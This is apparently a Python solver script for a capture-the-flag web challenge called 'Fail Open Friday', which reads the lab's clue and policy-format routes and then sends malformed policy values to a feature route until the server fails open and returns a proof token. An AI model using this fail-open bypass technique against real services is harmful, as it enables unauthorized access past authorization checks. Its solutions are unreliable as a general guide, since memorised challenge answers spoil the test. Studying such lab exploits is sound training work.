"""D28 "Fail Open Friday" (web-exploitation-day-24-fail-open-friday): remote policy decoder fails open.

Kit shape: /api/clues = {framework, feature_route, policy_format_route, current_role, expected_behavior};
GET policy_format_route -> {query_parameter, prefix "remote:<hex>:", encoding base64url JSON, sample_encoded};
GET feature?policy=<prefix><valid b64> -> {"ok":true,"policy":"standard"}; with an undecodable payload
(<prefix>!!!) -> {"ok":true,"effect":"exceptional_condition_fail_open","evidence":"proof_..."}.
"""
import json
import urllib.parse

from lib import websolve

KEY_MAP = [(r"^policy_format_route$", "day28_web_fail_open_friday")]

BAD = ("!!!", "%%%", "@@@@", "eyJ", "e30", "")


def _json(body):
    try:
        j = json.loads(body or "")
        return j if isinstance(j, dict) else {}
    except ValueError:
        return {}


def exploit(base, clues):
    base = base.rstrip("/")
    feat = clues.get("feature_route") or ""
    fmt_route = clues.get("policy_format_route") or "/api/policy-format"
    if not feat.startswith("/"):
        return None
    _, body, _ = websolve.fetch(base + fmt_route, timeout=6)
    fmt = _json(body)
    param = fmt.get("query_parameter") or "policy"
    prefix = fmt.get("prefix") or ""
    for bad in BAD:
        q = urllib.parse.urlencode({param: prefix + bad})
        _, body, _ = websolve.fetch(base + feat + "?" + q, timeout=6)
        p = websolve.proof(body)
        if p:
            return p
    return None


HANDLERS = {"day28_web_fail_open_friday": exploit}
